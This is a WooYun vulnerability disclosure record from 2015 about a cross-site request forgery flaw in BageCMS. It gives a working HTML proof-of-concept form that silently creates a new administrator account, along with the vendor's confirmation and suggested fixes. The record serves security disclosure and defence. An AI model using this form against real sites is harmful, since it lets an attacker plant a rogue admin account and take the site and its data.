{"id": 37063, "wybug_id": "wooyun-2015-0100519", "wybug_title": "bagecms csrf可以获取任意数据", "wybug_corp": "bagecms.com", "wybug_author": "路人甲", "wybug_date": "2015-03-11 11:35", "wybug_open_date": "2015-06-09 12:58", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-09：\t细节向公众公开  简要描述： csrf导致可以获取任意数据 详细说明：  增加管理员的时候，burp suite截获，发现存在csrf\n\n\n\ncsrf poc\n\n\n<html>  <!-- CSRF PoC - generated by Burp Suite Professional -->  <body>    <form action=\"http://localhost/bagecms/index.php?r=admini/admin/create\" method=\"POST\">      <input type=\"hidden\" name=\"Admin&#91;username&#93;\" value=\"test\" />      <input type=\"hidden\" name=\"Admin&#91;password&#93;\" value=\"test\" />      <input type=\"hidden\" name=\"Admin&#91;email&#93;\" value=\"test&#64;test&#46;com\" />      <input type=\"hidden\" name=\"Admin&#91;group&#95;id&#93;\" value=\"1\" />      <input type=\"hidden\" name=\"Admin&#91;realname&#93;\" value=\"test\" />      <input type=\"hidden\" name=\"Admin&#91;telephone&#93;\" value=\"\" />      <input type=\"hidden\" name=\"Admin&#91;mobile&#93;\" value=\"13800138000\" />      <input type=\"hidden\" name=\"Admin&#91;qq&#93;\" value=\"0\" />      <input type=\"hidden\" name=\"Admin&#91;notebook&#93;\" value=\"\" />      <input type=\"hidden\" name=\"Admin&#91;status&#95;is&#93;\" value=\"Y\" />      <input type=\"hidden\" name=\"submit\" value=\"æ&#143;&#144;äº&#164;\" />      <input type=\"submit\" value=\"Submit request\" />    </form>  </body></html>\n保存为html，发起请求   漏洞证明：  \n\n添加管理员成功管理员登陆，可以获取数据库信息等\n\n   修复方案：  建议增加请求url操作的权限，或者增加全局csrf防御增加token验证HTTP头的Referer用XMLHttpRequest附加在header里   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-03-11 12:57 厂商回复： 新版中会修复谢谢~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}